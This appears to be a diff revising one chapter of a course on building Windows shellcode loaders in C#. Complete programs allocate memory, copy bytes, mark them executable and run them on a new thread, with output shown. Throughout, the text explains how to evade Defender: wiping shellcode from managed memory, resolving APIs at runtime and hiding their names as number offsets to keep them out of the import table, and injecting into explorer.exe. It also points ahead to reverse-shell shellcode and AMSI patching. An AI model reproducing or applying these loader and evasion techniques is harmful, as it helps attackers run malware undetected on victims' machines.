-Let's call VirtualAlloc:
+Now let's call VirtualAlloc:
 
 ```csharp
-        uint memSize = 4096;
-        IntPtr mem = VirtualAlloc(IntPtr.Zero, memSize, 0x3000, 0x04);
+        uint size = 4096;
+        IntPtr mem = VirtualAlloc(IntPtr.Zero, size, 0x3000, 0x04);
 ```
 
-This asks Windows: "Give me 4096 bytes of memory. I need to be able to read and write to it. Put it wherever you want." Windows picks an address, reserves 4096 bytes at that address, and returns the address.
+This asks Windows: "Give me 4096 bytes of RAM that I can read and write to. Put it wherever you want." Windows picks an address, reserves 4096 bytes there, and returns the address.
 
 ```csharp
         if (mem == IntPtr.Zero)
         {
-            Console.WriteLine("[-] VirtualAlloc failed. Windows did not give us memory.");
+            Console.WriteLine("[-] VirtualAlloc failed. Windows did not give us RAM.");
             return;
         }
-        Console.WriteLine("[+] Windows gave us memory at address: 0x" + mem.ToString("X"));
+        Console.WriteLine("[+] Got RAM at address: 0x" + mem.ToString("X"));
 ```
 
-If VirtualAlloc returns zero, the allocation failed (usually means invalid parameters or out of memory). Otherwise, `mem` is a valid memory address where you have 4096 bytes of read-write memory.
+If VirtualAlloc returns zero, the request failed. Otherwise, `mem` is the address in RAM where you have 4096 bytes of read-write space.
 
 Here is the complete program:
 
@@ -401,7 +420,7 @@ class Program
 
     static void Main(string[] args)
     {
-        Console.WriteLine("[*] Asking Windows for 4096 bytes of read-write memory...");
+        Console.WriteLine("[*] Asking Windows for 4096 bytes of RAM (read-write)...");
 
         IntPtr mem = VirtualAlloc(IntPtr.Zero, 4096, 0x3000, 0x04);
 
@@ -411,54 +430,45 @@ class Program
             return;
         }
 
-        Console.WriteLine("[+] Got memory at address: 0x" + mem.ToString("X"));
-        Console.WriteLine("[*] This memory is read-write. We can store data in it.");
-        Console.WriteLine("[*] The CPU cannot execute code from it yet (no execute permission).");
+        Console.WriteLine("[+] Got RAM at address: 0x" + mem.ToString("X"));
+        Console.WriteLine("[*] We can read and write data here.");
+        Console.WriteLine("[*] The CPU cannot execute code from here (no execute permission).");
 
         VirtualFree(mem, 0, 0x8000);
-        Console.WriteLine("[+] Memory given back to Windows.");
+        Console.WriteLine("[+] RAM given back to Windows.");
     }
 }
 ```
 
-`VirtualFree` gives the memory back to Windows. `0x8000` is MEM_RELEASE, which releases the entire block. In a real loader, you do not free the memory because your shellcode needs to stay in it and keep running.
+`VirtualFree` gives the RAM section back to Windows so other programs can use it. `0x8000` is MEM_RELEASE, which releases the entire section. In a real loader, you do not free the RAM because your shellcode needs to stay in it and keep running.
 
-### Part 6: Copying Data Into Allocated Memory
+### Part 6: Copying Data Into the RAM Section
 
-After VirtualAlloc gives you a memory address, the memory is empty (all zeros). You need to copy your shellcode bytes into it. You already learned `Marshal.Copy` in Document 02. Here is how it works with VirtualAlloc:
+After VirtualAlloc gives you a section of RAM, that section is empty (all zeros). You need to copy your shellcode bytes into it. You already learned `Marshal.Copy` in Document 02. Here is how it works with VirtualAlloc:
 
 ```csharp
         byte[] data = new byte[] { 0xCC, 0x90, 0x90, 0xC3 };
 ```
 
-These are four harmless machine instructions: 0xCC is INT3 (a debugger breakpoint), 0x90 is NOP (do nothing), and 0xC3 is RET (return). We are using these for testing, not real shellcode.
+Four test bytes. 0xCC is INT3 (a debugger breakpoint instruction), 0x90 is NOP (a "do nothing" instruction), and 0xC3 is RET (a "return" instruction). These are harmless machine instructions, not real shellcode.
 
 ```csharp
         IntPtr mem = VirtualAlloc(IntPtr.Zero, (uint)data.Length, 0x3000, 0x04);
 ```
 
-Allocate memory the same size as the data array. `(uint)data.Length` converts the array length from int to uint because VirtualAlloc expects a uint.
+Request RAM the same size as the data. `(uint)data.Length` converts the array length from int to uint because VirtualAlloc expects a uint.
 
 ```csharp
         Marshal.Copy(data, 0, mem, data.Length);
 ```
 
-Copy the bytes from the C# array into the allocated memory. Parameters: source array, starting position in the array (0 means start from the first byte), destination memory address, number of bytes to copy.
-
-After this line, the memory at address `mem` contains the bytes 0xCC, 0x90, 0x90, 0xC3. The C# array `data` also still contains those bytes. You now have the data in two places.
+Copy the bytes from the C# array into the VirtualAlloc RAM section. The parameters: source array, starting position in the array (0 means the first byte), destination address in RAM, number of bytes to copy. After this, the RAM at address `mem` contains the bytes 0xCC, 0x90, 0x90, 0xC3.
 
 ```csharp
         Array.Clear(data, 0, data.Length);
 ```
 
-Clear the original C# array. Set every byte to zero. Now the data exists only in the VirtualAlloc memory. If Defender scans the managed memory of your .NET process, it will not find the shellcode there because you zeroed it out. The shellcode lives only in the unmanaged VirtualAlloc memory.
-
-```csharp
-        byte check = Marshal.ReadByte(mem);
-        Console.WriteLine("[*] First byte at memory address: 0x" + check.ToString("X2"));
-```
-
-`Marshal.ReadByte` reads one byte from a memory address. This verifies that the copy worked. It should read 0xCC, which is the first byte we copied in.
+Zero out the original C# array. Now the bytes exist only in the VirtualAlloc RAM, not in the .NET runtime's managed RAM. If Defender scans the .NET runtime's memory, it will not find the shellcode because you zeroed it out. The shellcode exists only in the section you got from VirtualAlloc.
 
 Here is the complete program:
 
@@ -488,16 +498,16 @@ class Program
             Console.WriteLine("[-] VirtualAlloc failed.");
             return;
         }
-        Console.WriteLine("[+] Memory allocated at: 0x" + mem.ToString("X"));
+        Console.WriteLine("[+] RAM allocated at: 0x" + mem.ToString("X"));
 
         Marshal.Copy(data, 0, mem, data.Length);
-        Console.WriteLine("[+] Copied " + data.Length + " bytes into allocated memory.");
+        Console.WriteLine("[+] Copied " + data.Length + " bytes into RAM.");
 
         Array.Clear(data, 0, data.Length);
-        Console.WriteLine("[+] Cleared the original C# array.");
+        Console.WriteLine("[+] Zeroed out the C# array.");
 
         byte check = Marshal.ReadByte(mem);
-        Console.WriteLine("[*] First byte in allocated memory: 0x" + check.ToString("X2"));
+        Console.WriteLine("[*] First byte in VirtualAlloc RAM: 0x" + check.ToString("X2"));
         Console.WriteLine("[*] First byte in C# array: " + data[0] + " (zero, because we cleared it)");
 
         VirtualFree(mem, 0, 0x8000);
@@ -509,17 +519,21 @@ class Program
 Output:
 ```
 [*] Created 4 bytes of test data.
-[+] Memory allocated at: 0x<some address>
-[+] Copied 4 bytes into allocated memory.
-[+] Cleared the original C# array.
-[*] First byte in allocated memory: 0xCC
+[+] RAM allocated at: 0x<address>
+[+] Copied 4 bytes into RAM.
+[+] Zeroed out the C# array.
+[*] First byte in VirtualAlloc RAM: 0xCC
 [*] First byte in C# array: 0 (zero, because we cleared it)
 [+] Done.
 ```
 
-### Part 7: VirtualProtect - Changing Memory Permissions
+The data is in the VirtualAlloc RAM at 0xCC. The C# array is zeroed. The data lives in only one place now.
 
-The memory from VirtualAlloc has read-write permissions (0x04). The data is in there. But the CPU still cannot execute it because the memory does not have execute permission. VirtualProtect changes the permissions of memory that already exists.
+### Part 7: VirtualProtect - Changing RAM Permissions
+
+The RAM from VirtualAlloc has read-write permissions (0x04). Your data is in there. But the CPU still cannot execute it because the RAM does not have execute permission. DEP prevents the CPU from running code from read-write RAM.
+
+VirtualProtect changes the permissions of a section of RAM that already exists:
 
 ```csharp
     [DllImport("kernel32.dll", SetLastError = true)]
@@ -530,13 +544,13 @@ The memory from VirtualAlloc has read-write permissions (0x04). The data is in t
         out uint lpflOldProtect);
 ```
 
-`IntPtr lpAddress` is the address of the memory block (from VirtualAlloc).
+`IntPtr lpAddress` is the address of the RAM section (from VirtualAlloc).
 
-`uint dwSize` is the size of the block in bytes.
+`uint dwSize` is the size of the section in bytes.
 
-`uint flNewProtect` is the new permission value. Use `0x20` (PAGE_EXECUTE_READ) to make it executable and readable.
+`uint flNewProtect` is the new permission value. Use `0x20` (PAGE_EXECUTE_READ) to give it execute and read permissions.
 
-`out uint lpflOldProtect` is where Windows stores the old permission value. The `out` keyword means Windows writes a value into this variable. You need to declare the variable before calling the function, but you do not usually need the old value for anything.
+`out uint lpflOldProtect` is where Windows writes the old permission value. The word `out` means Windows fills in this variable for you. You need to declare it before calling the function, but you usually do not need the old value.
 
 ```csharp
         uint oldPermissions;
@@ -547,18 +561,18 @@ The memory from VirtualAlloc has read-write permissions (0x04). The data is in t
             Console.WriteLine("[-] VirtualProtect failed.");
             return;
         }
-        Console.WriteLine("[+] Memory permissions changed to execute-read.");
+        Console.WriteLine("[+] RAM permissions changed to execute-read.");
 ```
 
-After this call, the memory at address `mem` is executable. The CPU can run the bytes stored there as machine instructions. You can no longer write to that memory because execute-read does not include write permission. But that is fine because you already copied the data in during the read-write phase.
+After this call, the CPU is allowed to run the bytes at address `mem` as instructions. You can no longer write to that RAM because execute-read does not include write permission. But that is fine because you already copied your data in.
 
-### Part 8: CreateThread - Running Code in Memory
+### Part 8: CreateThread - Telling the CPU to Run Your Code
 
-The data is in executable memory. The final step is telling the CPU to start running the bytes at that address. You do this by creating a new thread.
+The data is in RAM. The RAM has execute permission. The last step is telling the CPU to start running the bytes at that address.
 
-When your program starts, it runs on what is called the main thread. The main thread is the one that executes your Main function. A thread is a single sequence of instructions that the CPU follows. Your program can create additional threads, and each one runs independently at the same time.
+Your program already has one thread running: the main thread, which is executing your Main function right now. A thread is a sequence of instructions that the CPU follows one by one. Your program can create additional threads, and each thread runs at the same time, independently of the others.
 
-CreateThread creates a new thread that starts running at a specific memory address. If that address contains your shellcode, the CPU starts executing your shellcode.
+CreateThread creates a new thread that starts running at a specific address in RAM. If that address contains your shellcode, the CPU starts executing your shellcode:
 
 ```csharp
     [DllImport("kernel32.dll", SetLastError = true)]
@@ -571,16 +585,16 @@ CreateThread creates a new thread that starts running at a specific memory addre
         out uint lpThreadId);
 ```
 
-This has six parameters, but only one matters for us:
+This has six parameters but only one matters for what we are doing:
 
-`IntPtr lpStartAddress` is the memory address where the new thread begins executing. You pass the address from VirtualAlloc.
+`IntPtr lpStartAddress` is the RAM address where the new thread starts executing. You pass the address from VirtualAlloc.
 
-The rest are set to default values:
-- `IntPtr.Zero` for lpThreadAttributes means default security.
-- `0` for dwStackSize means default stack size.
-- `IntPtr.Zero` for lpParameter means no extra data passed to the thread.
-- `0` for dwCreationFlags means the thread starts running immediately.
-- `out uint lpThreadId` receives the ID number of the new thread.
+The other five use default values:
+- `IntPtr.Zero` for lpThreadAttributes means default security settings
+- `0` for dwStackSize means default stack size (a stack is a section of RAM each thread gets for its own temporary data)
+- `IntPtr.Zero` for lpParameter means no extra data passed to the thread
+- `0` for dwCreationFlags means the thread starts running immediately
+- `out uint lpThreadId` receives the ID number Windows assigns to the new thread
 
 ```csharp
         IntPtr thread = CreateThread(IntPtr.Zero, 0, mem, IntPtr.Zero, 0, out uint tid);
@@ -590,10 +604,10 @@ The rest are set to default values:
             Console.WriteLine("[-] CreateThread failed.");
             return;
         }
-        Console.WriteLine("[+] New thread started with ID: " + tid);
+        Console.WriteLine("[+] Thread " + tid + " is now running.");
 ```
 
-After CreateThread, the CPU is running the bytes at address `mem` on a new thread. But the main thread (your Main function) keeps going too. If Main reaches the end and the program exits, the new thread dies with it. For shellcode that keeps running (a reverse shell connection stays open until you close it), you need to prevent Main from exiting.
+After this call, the CPU is running the bytes at address `mem` on a new thread. But the main thread (your Main function) keeps going too. If Main reaches the end and your program exits, the new thread dies with it. For shellcode that keeps running (a reverse shell stays connected until you close it), you need the main thread to wait.
 
 WaitForSingleObject pauses the main thread until the new thread finishes:
 
@@ -606,9 +620,9 @@ WaitForSingleObject pauses the main thread until the new thread finishes:
         WaitForSingleObject(thread, 0xFFFFFFFF);
 ```
 
-`0xFFFFFFFF` means wait forever. The main thread stops at this line and does nothing until the new thread finishes executing. For a reverse shell, the new thread runs until the attacker closes the connection.
+`thread` is the handle to the new thread (returned by CreateThread). `0xFFFFFFFF` means wait forever. The main thread stops at this line and does nothing until the shellcode thread finishes.
 
-Here is the complete program that puts VirtualAlloc, Marshal.Copy, VirtualProtect, CreateThread, and WaitForSingleObject together. It executes a single byte `0xC3`, which is the machine instruction RET (return from function). This instruction immediately returns, ending the thread:
+Here is the complete program that puts everything together. It runs a single byte: `0xC3`, which is the machine instruction RET (return). This instruction immediately returns, ending the thread:
 
 ```csharp
 using System;
@@ -646,10 +660,10 @@ class Program
             Console.WriteLine("[-] VirtualAlloc failed.");
             return;
         }
-        Console.WriteLine("[+] Memory at: 0x" + mem.ToString("X"));
+        Console.WriteLine("[+] RAM allocated at: 0x" + mem.ToString("X"));
 
         Marshal.Copy(code, 0, mem, code.Length);
-        Console.WriteLine("[+] Code copied to memory.");
+        Console.WriteLine("[+] Code copied to RAM.");
 
         uint oldProtect;
         if (!VirtualProtect(mem, (uint)code.Length, 0x20, out oldProtect))
@@ -657,7 +671,7 @@ class Program
             Console.WriteLine("[-] VirtualProtect failed.");
             return;
         }
-        Console.WriteLine("[+] Memory is now executable.");
+        Console.WriteLine("[+] RAM is now executable.");
 
         IntPtr thread = CreateThread(IntPtr.Zero, 0, mem, IntPtr.Zero, 0, out uint tid);
         if (thread == IntPtr.Zero)
@@ -676,48 +690,48 @@ class Program
 Output:
 ```
 [*] Code: 1 byte (RET instruction, returns immediately).
-[+] Memory at: 0x<address>
-[+] Code copied to memory.
-[+] Memory is now executable.
+[+] RAM allocated at: 0x<address>
+[+] Code copied to RAM.
+[+] RAM is now executable.
 [+] Thread <id> is running the code.
 [+] Thread finished.
 ```
 
-The CPU started executing at the address. It hit the byte 0xC3 (RET), which means "return." The thread ended immediately. In Document 05, you replace `{ 0xC3 }` with real msfvenom shellcode. The only thing that changes is the bytes. The pattern stays the same: allocate, copy, protect, thread, wait.
+The CPU started executing at the address in RAM. It found the byte 0xC3 (RET), which means "return." The thread ended immediately. In Document 05, you replace `{ 0xC3 }` with real msfvenom shellcode. The only thing that changes is the bytes. The VirtualAlloc, Marshal.Copy, VirtualProtect, CreateThread, WaitForSingleObject pattern stays identical.
 
-### Part 9: GetModuleHandle and GetProcAddress - Finding Functions at Runtime
+### Part 9: GetModuleHandle and GetProcAddress - Finding Functions Without DllImport
 
-Every DllImport you write puts the function name and DLL name into the compiled binary's import table. Defender reads the import table. If your binary's import table says it imports VirtualAlloc, VirtualProtect, and CreateThread, Defender knows this program can allocate executable memory and start code in it. That is suspicious.
+Every DllImport you write puts the function name into the compiled binary's import table. The import table is a list inside the .exe or .dll file that says "this program uses these functions from these DLLs." Defender reads this list. If your import table says your program uses VirtualAlloc, VirtualProtect, and CreateThread together, Defender knows this combination is used for code injection and flags your program before it even runs.
 
-To avoid this, you can find functions at runtime instead of declaring them with DllImport. Two functions help with this:
+To avoid putting function names in the import table, you can find functions at runtime using two Windows functions: GetModuleHandle and GetProcAddress.
 
 ```csharp
     [DllImport("kernel32.dll")]
     static extern IntPtr GetModuleHandle(string lpModuleName);
 ```
 
-GetModuleHandle takes a DLL name and returns the memory address where that DLL is loaded. Every Windows process automatically loads kernel32.dll when it starts, so GetModuleHandle("kernel32.dll") always works.
+GetModuleHandle takes a DLL name and returns the address in RAM where that DLL is loaded. When a program starts, Windows automatically loads several DLLs into the program's RAM space. kernel32.dll is always loaded because every program needs it. GetModuleHandle("kernel32.dll") gives you the RAM address where kernel32.dll starts.
 
 ```csharp
     [DllImport("kernel32.dll")]
     static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);
 ```
 
-GetProcAddress takes two things: the address of a DLL (from GetModuleHandle) and the name of a function inside that DLL. It returns the memory address of that function.
+GetProcAddress takes two things: the RAM address of a DLL (from GetModuleHandle) and the name of a function inside that DLL. It returns the RAM address of that function.
 
 Together:
 
 ```csharp
         IntPtr k32 = GetModuleHandle("kernel32.dll");
-        Console.WriteLine("[+] kernel32.dll loaded at: 0x" + k32.ToString("X"));
+        Console.WriteLine("[+] kernel32.dll is loaded at: 0x" + k32.ToString("X"));
 
         IntPtr funcAddr = GetProcAddress(k32, "VirtualAlloc");
         Console.WriteLine("[+] VirtualAlloc is at: 0x" + funcAddr.ToString("X"));
 ```
 
-Now you have the raw address of VirtualAlloc in memory. But having an address is not enough. C# needs to know what parameters the function takes so it can call it correctly. You provide this information with a delegate.
+Now you have the RAM address of VirtualAlloc. But you cannot just call a RAM address in C#. C# needs to know what parameters the function takes so it calls it correctly. You tell C# with a delegate.
 
-A delegate defines the shape of a function: what parameters it takes and what it returns. You already learned functions in Document 02. A delegate is like a blueprint for a function:
+A delegate is a description of a function's shape: what parameters it takes and what it returns. It is like a blueprint:
 
 ```csharp
     [UnmanagedFunctionPointer(CallingConvention.StdCall)]
@@ -726,31 +740,31 @@ A delegate defines the shape of a function: what parameters it takes and what it
         uint flAllocationType, uint flProtect);
 ```
 
-This says "a VirtualAllocDelegate is any function that takes these four parameters and returns an IntPtr." The attribute `[UnmanagedFunctionPointer(CallingConvention.StdCall)]` tells C# that this function follows the Windows calling convention (StdCall), which is the standard way Windows functions receive their parameters.
+This says "a VirtualAllocDelegate is any function that takes these four parameters and returns an IntPtr." The `[UnmanagedFunctionPointer(CallingConvention.StdCall)]` line tells C# that this function follows the Windows calling convention. A calling convention is the agreed-upon order and method for passing parameters to a function. Windows functions use StdCall, which is the standard Windows method.
 
-Now convert the address into something you can call:
+Now convert the address to something callable:
 
 ```csharp
         var allocFunc = (VirtualAllocDelegate)Marshal.GetDelegateForFunctionPointer(
             funcAddr, typeof(VirtualAllocDelegate));
 ```
 
-`Marshal.GetDelegateForFunctionPointer` takes the memory address and the delegate type, and gives you a callable function. Now you call VirtualAlloc through `allocFunc`:
+`Marshal.GetDelegateForFunctionPointer` takes a RAM address and a delegate type, and gives you something you can call like a regular C# function. Now call VirtualAlloc through `allocFunc`:
 
 ```csharp
         IntPtr mem = allocFunc(IntPtr.Zero, 4096, 0x3000, 0x04);
 ```
 
-This does the same thing as calling VirtualAlloc through DllImport. The difference is that "VirtualAlloc" does not appear in the compiled binary's import table. You only have DllImport for GetModuleHandle and GetProcAddress, which are used by thousands of legitimate programs and are not suspicious.
+This does the same thing as calling VirtualAlloc through DllImport. The difference is that "VirtualAlloc" does not appear in the compiled binary's import table because you did not use DllImport for it. You only used DllImport for GetModuleHandle and GetProcAddress, which are called by thousands of legitimate programs and are not suspicious on their own.
 
-In the real loaders (Documents 05 through 10), even the string "VirtualAlloc" is hidden. Instead of passing the name directly to GetProcAddress, the loader builds the name from numbers using FromOffsets (from Document 02):
+In the real loaders (Documents 05 through 10), even the text "VirtualAlloc" is hidden. Instead of passing the name as a string to GetProcAddress, the loader builds the name from numbers using FromOffsets (from Document 02):
 
 ```csharp
         string name = FromOffsets(32, 54,73,82,84,85,65,76,33,76,76,79,67);
         IntPtr funcAddr = GetProcAddress(k32, name);
 ```
 
-The compiled binary contains the numbers 32, 54, 73, 82, etc. Defender's static scanner sees numbers, not the text "VirtualAlloc." The text is built only when the program runs, in memory, and disappears when the program exits.
+The compiled binary contains numbers (32, 54, 73...) instead of the text "VirtualAlloc." The text is built only when the program runs, in RAM, and disappears when the program exits. Defender's static scanner reads the file on disk and sees numbers, not function names.
 
 Here is the complete program:
 
@@ -794,7 +808,7 @@ class Program
 
         var allocFunc = (VirtualAllocDelegate)Marshal.GetDelegateForFunctionPointer(
             vaAddr, typeof(VirtualAllocDelegate));
-        Console.WriteLine("[+] Created callable function from address.");
+        Console.WriteLine("[+] Created callable function from RAM address.");
 
         IntPtr mem = allocFunc(IntPtr.Zero, 4096, 0x3000, 0x04);
         if (mem == IntPtr.Zero)
@@ -802,19 +816,19 @@ class Program
             Console.WriteLine("[-] Dynamic VirtualAlloc call failed.");
             return;
         }
-        Console.WriteLine("[+] Allocated memory at: 0x" + mem.ToString("X"));
+        Console.WriteLine("[+] Allocated RAM at: 0x" + mem.ToString("X"));
 
         VirtualFree(mem, 0, 0x8000);
-        Console.WriteLine("[+] Memory freed. Done.");
+        Console.WriteLine("[+] RAM freed. Done.");
     }
 }
 ```
 
 ### Part 10: OpenProcess - Accessing Another Running Program
 
-Documents 09 and 10 inject code into other running programs instead of running it in the loader's own process. To do this, you first need to get a handle to the target process.
+Documents 09 and 10 inject code into other running programs. Instead of running shellcode in your loader's own process, you put it inside a trusted program like explorer.exe. This is harder for Defender to detect because the shellcode runs inside a program that Windows considers legitimate.
 
-On your Windows VM right now, programs like explorer.exe (the desktop and file manager), svchost.exe (Windows services), and others are running. Each one has its own process ID and its own private memory space. OpenProcess asks Windows for a handle to one of these running processes:
+To interact with another running program, you first need a handle to it. OpenProcess gives you that handle:
 
 ```csharp
     [DllImport("kernel32.dll", SetLastError = true)]
@@ -822,24 +836,26 @@ On your Windows VM right now, programs like explorer.exe (the desktop and file m
 ```
 
 `dwDesiredAccess` specifies what you want to do with the process:
-- `0x0400` is PROCESS_QUERY_INFORMATION. It lets you read information about the process (its name, memory usage, etc.) but you cannot modify anything. This is safe.
-- `0x001FFFFF` is PROCESS_ALL_ACCESS. It gives you full control over the process, including writing to its memory and creating threads in it. This is what the injection loaders use.
+- `0x0400` is PROCESS_QUERY_INFORMATION. You can read information about the process (its name, how much RAM it uses) but you cannot change anything inside it. This is safe.
+- `0x001FFFFF` is PROCESS_ALL_ACCESS. You get full control, including writing data into the process's RAM and creating threads inside it. The injection loaders use this.
 
 `bInheritHandle` is almost always `false`.
 
-`dwProcessId` is the PID of the process you want to open.
+`dwProcessId` is the PID (process ID) of the program you want to open.
 
-C# has a built-in way to find processes by name:
+C# has a built-in way to find running programs by name:
 
 ```csharp
 using System.Diagnostics;
 ```
 
+`System.Diagnostics` contains tools for working with running processes. The class `Process` inside it lets you search for and get information about running programs.
+
 ```csharp
         Process[] found = Process.GetProcessesByName("explorer");
 ```
 
-This searches all running processes for ones named "explorer" (you leave off the .exe part). It returns an array because there could be multiple instances.
+This searches all running programs for ones named "explorer" (you leave off the .exe part). It returns an array because there could be multiple instances of the same program running.
 
 ```csharp
         if (found.Length == 0)
@@ -852,7 +868,7 @@ This searches all running processes for ones named "explorer" (you leave off the
         Console.WriteLine("[+] Found explorer.exe with PID: " + targetPid);
 ```
 
-`found[0].Id` gets the PID of the first explorer.exe found.
+`found[0].Id` gets the PID of the first explorer.exe instance found.
 
 ```csharp
         IntPtr handle = OpenProcess(0x0400, false, targetPid);
@@ -867,27 +883,25 @@ This searches all running processes for ones named "explorer" (you leave off the
         Console.WriteLine("[+] Handle closed.");
 ```
 
-This opens explorer.exe with read-only permissions. It does not modify anything. It just proves you can get a handle to another process.
+This opens explorer.exe with read-only permissions. It does not modify anything. It proves you can get a handle to another running program.
 
 For injection (Documents 09 and 10), after getting a handle with PROCESS_ALL_ACCESS, you use three more functions:
 
-**VirtualAllocEx** allocates memory inside the target process. It is like VirtualAlloc but the memory goes into the other process, not yours.
+**VirtualAllocEx** requests a section of RAM inside the target process. It is the same as VirtualAlloc but the RAM goes into the other program, not yours.
 
-**WriteProcessMemory** copies bytes from your process into the target process. It is like Marshal.Copy but across process boundaries.
+**WriteProcessMemory** copies bytes from your program's RAM into the target program's RAM.
 
-**CreateRemoteThread** creates a thread in the target process. It is like CreateThread but the thread runs inside the other process.
+**CreateRemoteThread** creates a thread in the target program. The thread starts executing at the address where you wrote your shellcode.
 
-The full injection pattern is:
+The full injection pattern:
 
-1. Find the target process by name
+1. Find the target program by name
 2. OpenProcess to get a handle with full access
-3. VirtualAllocEx to allocate memory in the target process
-4. WriteProcessMemory to copy shellcode into that memory
-5. CreateRemoteThread to start executing the shellcode inside the target process
+3. VirtualAllocEx to get RAM inside the target program
+4. WriteProcessMemory to copy shellcode into that RAM
+5. CreateRemoteThread to start a thread in the target that runs the shellcode
 
-We do not call VirtualAllocEx, WriteProcessMemory, or CreateRemoteThread in this document because they need real shellcode and a properly set up attack scenario. You will use them in Document 09.
-
-Here is the safe OpenProcess example:
+You will use these functions in Document 09. Here is the safe OpenProcess example:
 
 ```csharp
 using System;
@@ -931,35 +945,35 @@ class Program
 }
 ```
 
-Run with `dotnet run` to target explorer, or `dotnet run -- notepad` to target notepad (if it is running).
+Run with `dotnet run` (targets explorer by default) or `dotnet run -- notepad` (targets notepad if it is running).
 
 ### Part 11: The Complete Loader Pattern
 
-Every loader in Documents 05 through 10 follows the same sequence of steps. Now that you understand each function, here is the full pattern:
+Every loader in Documents 05 through 10 follows the same sequence. Now that you understand each function, here is the full pattern:
 
 ```
 Step 1: Read encrypted shellcode from a file on disk (File.ReadAllBytes from Document 02)
 Step 2: Get the decryption key from the command line (args from Document 02)
 Step 3: Decrypt the shellcode using XOR (TransformData from Document 02)
-Step 4: Allocate read-write memory (VirtualAlloc with 0x04)
-Step 5: Copy decrypted shellcode into that memory (Marshal.Copy)
-Step 6: Clear the shellcode from the C# array (Array.Clear)
-Step 7: Change memory to executable (VirtualProtect with 0x20)
-Step 8: Create a thread at the shellcode address (CreateThread)
+Step 4: Request read-write RAM from Windows (VirtualAlloc with 0x04)
+Step 5: Copy decrypted shellcode into that RAM (Marshal.Copy)
+Step 6: Zero out the shellcode from the C# array (Array.Clear)
+Step 7: Change the RAM permissions to executable (VirtualProtect with 0x20)
+Step 8: Create a new thread at the shellcode address (CreateThread)
 Step 9: Wait for the thread to finish (WaitForSingleObject)
 ```
 
-For remote injection (injecting into another process), steps 4 through 8 change:
+For remote injection (putting shellcode into another program), steps 4 through 8 change:
 
 ```
-Step 4: Open the target process (OpenProcess)
-Step 5: Allocate memory inside the target process (VirtualAllocEx)
-Step 6: Copy shellcode into the target process (WriteProcessMemory)
-Step 7: Change permissions in the target process (VirtualProtectEx)
-Step 8: Create a thread in the target process (CreateRemoteThread)
+Step 4: Open the target program (OpenProcess)
+Step 5: Request RAM inside the target program (VirtualAllocEx)
+Step 6: Copy shellcode into the target program's RAM (WriteProcessMemory)
+Step 7: Change RAM permissions in the target program (VirtualProtectEx)
+Step 8: Create a thread in the target program (CreateRemoteThread)
 ```
 
-The idea is the same either way: get shellcode bytes into executable memory and tell the CPU to run them. The only difference is whether the memory is in your own process or in another process.
+The idea is the same: get shellcode bytes into executable RAM and tell the CPU to run them. The only difference is whether the RAM is in your own program or in another program.
 
 Document 05 builds the first real working loader using this pattern.
 
@@ -972,75 +986,78 @@ For every example:
 3. Run: `dotnet run`
 4. For programs with arguments: `dotnet run -- notepad`
 
-The MessageBox example needs the desktop (it does not work from SSH). All other examples work from any terminal.
+The MessageBox example needs the Windows desktop (it shows a visual dialog box). All other examples work from any terminal.
 
 ## Confirming Success
 
 After this document, verify:
 
+- [ ] You understand that RAM is your computer's fast temporary storage where programs run
 - [ ] You understand that programs ask Windows to do things by calling Windows API functions
-- [ ] You know that DLL files contain collections of Windows functions (kernel32.dll, user32.dll, ntdll.dll)
+- [ ] You know that DLL files in C:\Windows\System32\ contain collections of these functions
+- [ ] You know what P/Invoke is (a C# feature that lets you call Windows functions using DllImport)
 - [ ] You can declare a Windows function with [DllImport] and call it from C#
-- [ ] You called MessageBox and saw a dialog box appear on screen
+- [ ] You called MessageBox and saw a dialog box on screen
 - [ ] You called GetCurrentProcessId and verified the PID in Task Manager
-- [ ] You understand that handles are reference numbers Windows uses to track resources
-- [ ] You can call VirtualAlloc to get a block of memory with specific permissions
-- [ ] You can use Marshal.Copy to put bytes into allocated memory
-- [ ] You can use VirtualProtect to change memory permissions to executable
-- [ ] You can use CreateThread to start running code at a memory address
+- [ ] You understand that a handle is a reference number Windows uses to track a resource
+- [ ] You can call VirtualAlloc to request a section of RAM with specific permissions
+- [ ] You understand why DEP prevents the CPU from executing code in regular C# arrays
+- [ ] You can use Marshal.Copy to put bytes into VirtualAlloc RAM
+- [ ] You can use VirtualProtect to change RAM permissions to executable
+- [ ] You can use CreateThread to start a new thread at a RAM address
 - [ ] You can use WaitForSingleObject to keep the program alive while the thread runs
-- [ ] You understand that DllImport puts function names in the import table, and Defender reads the import table
-- [ ] You can use GetModuleHandle and GetProcAddress to find functions at runtime without DllImport
-- [ ] You can find a running process by name and open it with OpenProcess
+- [ ] You understand the import table and why DllImport puts function names into it
+- [ ] You can use GetModuleHandle and GetProcAddress to find functions without DllImport
+- [ ] You can find a running program by name and open it with OpenProcess
 
 ## What Was Gained
 
-You now know how to call Windows functions from C#. Every C# program that interacts with the Windows operating system uses the pattern you learned here: declare the function with DllImport (or find it at runtime with GetProcAddress), describe its parameters, and call it.
+You now know how to call Windows functions from C#. Every C# program that interacts with the Windows operating system uses the DllImport pattern you learned here.
 
 The specific functions you learned are the building blocks of every loader:
 
-- **VirtualAlloc** gets memory from Windows with the permissions you choose
-- **Marshal.Copy** puts your shellcode bytes into that memory
-- **VirtualProtect** changes the memory permissions so the CPU can execute the bytes
-- **CreateThread** starts a new thread that runs the bytes as code
-- **WaitForSingleObject** keeps the program alive while the shellcode runs
-- **GetModuleHandle + GetProcAddress** find functions at runtime so their names do not appear in the import table
-- **OpenProcess** gives you access to another running process for injection
+- **VirtualAlloc** requests a section of RAM from Windows with the permissions you choose
+- **Marshal.Copy** puts your shellcode bytes into that RAM
+- **VirtualProtect** changes the RAM permissions so the CPU can execute the bytes as code
+- **CreateThread** creates a new thread that starts running at the shellcode's address
+- **WaitForSingleObject** keeps the program alive while the shellcode thread runs
+- **GetModuleHandle + GetProcAddress** find functions at runtime so their names stay out of the import table
+- **OpenProcess** gives you a handle to another running program for injection
 
-The differences between the 8 loaders are which evasion techniques they add on top of this base pattern: XOR encryption (Document 06), direct syscalls that bypass Defender's hooks (Document 07), patching AMSI (Document 08), reflective DLL injection (Document 09), and everything combined (Document 10).
+The differences between the 8 loaders are which evasion techniques they add on top of this pattern: XOR encryption (Document 06), direct syscalls that bypass Defender's hooks (Document 07), patching AMSI (Document 08), reflective DLL injection (Document 09), and everything combined (Document 10).
 
 ## Common Threats and Variations
 
-### Variation 1: Using ntdll.dll Instead of kernel32.dll
+### Variation 1: Calling ntdll.dll Instead of kernel32.dll
 
